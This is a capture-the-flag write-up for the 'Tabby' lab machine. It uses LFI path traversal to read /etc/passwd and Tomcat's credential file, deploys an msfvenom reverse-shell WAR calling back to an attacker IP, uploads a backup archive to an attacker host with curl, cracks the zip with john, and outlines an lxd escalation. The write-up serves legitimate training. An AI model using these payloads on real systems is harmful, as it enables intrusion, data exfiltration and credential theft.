#Linux #LFI #Tomcat #WAR #john #zip2john #PasswordReuse #lxd #ContainerEscape

## Overview

Tabby is an easy Linux box running Apache and Tomcat in parallel. An LFI in a news page leaks the Tomcat `tomcat-users.xml` credential file. Those credentials allow WAR deployment via Tomcat's text manager, giving a shell as the `tomcat` user. A password-protected ZIP archive in the webroot cracks with `zip2john`, and the password reuses to `su ash`. Ash is in the `lxd` group, which is the vector for the privilege escalation.

> **Note:** the notes document the lxd escalation path as far as identifying the container image build requirement (Alpine Linux via lxd-alpine-builder) but do not include the execution steps. The writeup covers what is documented; the lxd container escape is written as in-progress.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
```

Adding the FQDN to `/etc/hosts`:

```
megahosting.htb
```

### LFI Discovery

Port 80's `news.php` page calls files via a `file` parameter. Testing path traversal confirms LFI:

```sh
http://megahosting.htb/news.php?file=../../../../../etc/passwd
```

## Foothold

### Leaking Tomcat Credentials via LFI

Tomcat stores its user/role configuration in `tomcat-users.xml`. The default path for the Ubuntu `tomcat9` package is `/usr/share/tomcat9/etc/tomcat-users.xml`:

```sh
view-source:http://megahosting.htb/news.php?file=../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

Credentials extracted:

```sh
tomcat:$3cureP4s5w0rd123!
```

> **Why this works:** Tomcat's text manager (`/manager/text`) is accessible without a browser and allows WAR deployment over HTTP. The GUI manager is often locked to specific IP ranges, but the text endpoint uses the same credential check and is frequently left open. LFI is the key to finding the credential file when it isn't in a default guessable location.

### WAR Deployment via Tomcat Text Manager

The text manager lists running apps:

```
http://megahosting.htb:8080/manager/text/list
```

Generate a reverse shell WAR with msfvenom:

```sh
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.58 lport=53 -f war -o rev.war
```

Deploy via cURL with the recovered credentials:

```sh
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.129.154.37:8080/manager/text/deploy?path=/tester --upload-file rev.war
OK - Deployed application at context path [/tester]
```

Trigger the payload:

```sh
curl http://10.129.154.37:8080/tester
```

Shell received:

```sh
rlwrap nc -lvnp 53
whoami
tomcat
```

Upgrade to TTY:

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

### ZIP Archive → ash

A backup archive lives in `/var/www/html/files/`. Exfiltrate it to the attacker machine:

```sh
curl -F 'file=@/var/www/html/files/16162020_backup.zip' http://10.10.14.158:8000/
```

Convert the password-protected ZIP to a john-crackable hash:

```sh
zip2john 16162020_backup.zip > johnzip
john johnzip --wordlist=/usr/share/wordlists/rockyou.txt
admin@it         (16162020_backup.zip)
```

The archive contents aren't useful, but the password reuses for `su`:

```sh
tomcat@tabby:/var/www/html/files$ su ash
Password: admin@it

ash@tabby:~$
```

User flag obtained from `ash`'s home directory.

### lxd Group (In Progress)

Ash is a member of the `lxd` group:

```
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

```sh
ash@tabby:/snap/bin$ ./lxc list
[empty container list]
```

The container host has no images. The path requires building an Alpine Linux image using the `lxd-alpine-builder` project (https://github.com/saghul/lxd-alpine-builder), importing it into lxd, creating a privileged container with the host root filesystem mounted inside, and using it to read or write the host as root.

> **Note:** these notes are incomplete, the lxd container import and root filesystem mount steps are not documented; written as in-progress.

## Takeaways

- **LFI + known config file paths = credential recovery.** `tomcat-users.xml` is in a predictable location on Debian/Ubuntu packages; LFI is enough to read it.
- **The Tomcat text manager is a WAR deployment endpoint that survives even when the GUI is restricted.** Always check `/manager/text/` with any Tomcat credentials found.
- **Password reuse between a ZIP archive and system accounts is common.** Crack every archive found in webroot directories.
- **lxd group membership is equivalent to root.** Any user who can manage LXD containers can mount the host filesystem inside a privileged container.
